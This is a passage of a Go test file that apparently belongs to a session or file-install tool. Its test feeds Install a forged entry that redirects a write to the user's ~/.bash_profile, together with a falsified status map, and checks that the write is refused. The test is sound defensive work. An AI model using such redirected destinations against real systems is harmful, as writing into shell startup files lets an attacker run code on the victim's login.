	if _, err := os.Lstat(target); !os.IsNotExist(err) {
		t.Errorf("%s must not have been created: lstat err = %v", target, err)
	}
}

// TestInstallRefusesPackEntryEvenWithHostileStatusMap is Install's own
// independent half of the same defense (mirrors
// TestInstallRefusesCaptureDstEvenWithHostileStatusMap): even a hostile
// status map that claims staged-same — bypassing Diff's own refusal
// entirely, e.g. via a peer whose Diff is older or simply a bug — must not
// get a pack-category entry installed, target absent or not.
func TestInstallRefusesPackEntryEvenWithHostileStatusMap(t *testing.T) {
	m, staging, p := staged(t)
	victim := 2 // a plain session-category file, repurposed as the attack entry
	if !m.Entries[victim].IsRegular() {
		t.Fatalf("fixture entry %d is not a plain file: %+v", victim, m.Entries[victim])
	}
	target := filepath.Join(p.Home, ".bash_profile") // absent
	m.Entries[victim].Category = session.CatPack
	m.Entries[victim].Dst = target

	st := map[int]Status{}
	for _, e := range m.Entries {
		st[e.ID] = StagedSame
	}
	_, err := Install(context.Background(), m, st, staging, p, InstallExtras{})
	if err == nil || !strings.Contains(err.Error(), target) || !strings.Contains(err.Error(), "pack") {
		t.Fatalf("err = %v, want a pack-entry refusal naming %s", err, target)
	}
	if _, err := os.Lstat(target); !os.IsNotExist(err) {
		t.Errorf("%s must not have been created: lstat err = %v", target, err)
	}
}
